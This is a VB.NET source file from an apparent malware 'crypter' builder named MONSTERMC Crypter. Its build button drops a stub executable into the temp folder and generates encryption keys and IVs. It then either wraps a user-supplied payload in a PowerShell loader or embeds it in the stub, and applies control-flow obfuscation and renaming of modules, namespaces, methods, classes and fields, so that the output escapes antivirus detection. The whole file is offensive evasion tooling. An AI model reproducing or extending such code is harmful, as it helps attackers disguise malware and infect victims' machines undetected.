Imports dnlib.DotNet
Imports MONSTERMC.NugetaCrypterGUI
Imports System
Imports System.IO
Imports System.Windows.Forms
Imports MONSTERMC.MONSTERMCCrypterGUI.Forms.SubForms

Namespace MONSTERMCCrypterGUI.Forms.SubForms
    Partial Public Class SubBuild
        Inherits Form
        Public Sub New()
            InitializeComponent()
        End Sub

        Private Sub SubBuild_Load(ByVal sender As Object, ByVal e As EventArgs)
            ControlBox = False
        End Sub

        Private Sub StartBuildBtn_Click(ByVal sender As Object, ByVal e As EventArgs)
            Call File.WriteAllBytes(IO.Path.GetTempPath() & "Stub.exe", Files.stub)
            File.WriteAllText("Key.txt", Convert.ToBase64String(Randomize.Randomize.RandomIvKey(16)))
            File.WriteAllText("Iv.txt", Convert.ToBase64String(Randomize.Randomize.RandomIvKey(16)))
            File.WriteAllText("PowershellKey.txt", Convert.ToBase64String(Powershell.RandomKeyandIv.GenerateRandomBytes(32)))
            File.WriteAllText("PowershellIv.txt", Convert.ToBase64String(Powershell.RandomKeyandIv.GenerateRandomBytes(16)))
            If Path.Batch Then
                Powershell.Build.Create(payloadText.Text)
            Else
                Call File.Copy(IO.Path.GetTempPath() & "Stub.exe", IO.Path.GetTempPath() & "tmp.exe")
                Build.Build.AddCode(IO.Path.GetTempPath() & "tmp.exe", Randomize.Randomize.SourceEncrypt().Item1, Randomize.Randomize.SourceEncrypt().Item2, Randomize.Randomize.SourceEncrypt().Item5, Randomize.Randomize.SourceEncrypt().Item6, Randomize.Randomize.SourceEncrypt().Item7)
                Using [mod] As ModuleDefMD = ModuleDefMD.Load(IO.Path.GetTempPath() & "tmp.exe")
                    Obfuscation.ControlFlowObfuscation.Execute([mod])
                    Obfuscation.RenamerPhase.ExecuteModuleRenaming([mod])
                    Obfuscation.RenamerPhase.ExecuteNamespaceRenaming([mod])
                    Obfuscation.RenamerPhase.ExecuteMethodRenaming([mod])
                    Obfuscation.RenamerPhase.ExecuteClassRenaming([mod])
                    Obfuscation.RenamerPhase.ExecuteFieldRenaming([mod])
                    If Not Equals(Path.Extension, Nothing) Then
                        [mod].Write(payloadText.Text & Path.Extension)
                    Else
                        [mod].Write(payloadText.Text & ".exe")
                    End If
                End Using
                Try
                    Call File.Delete(IO.Path.GetTempPath() & "tmp.exe")
                Catch
                End Try
                File.Delete("Key.txt")
                File.Delete("Iv.txt")
                File.Delete("PowershellKey.txt")
                File.Delete("PowershellIv.txt")
            End If

        End Sub
    End Class
End Namespace
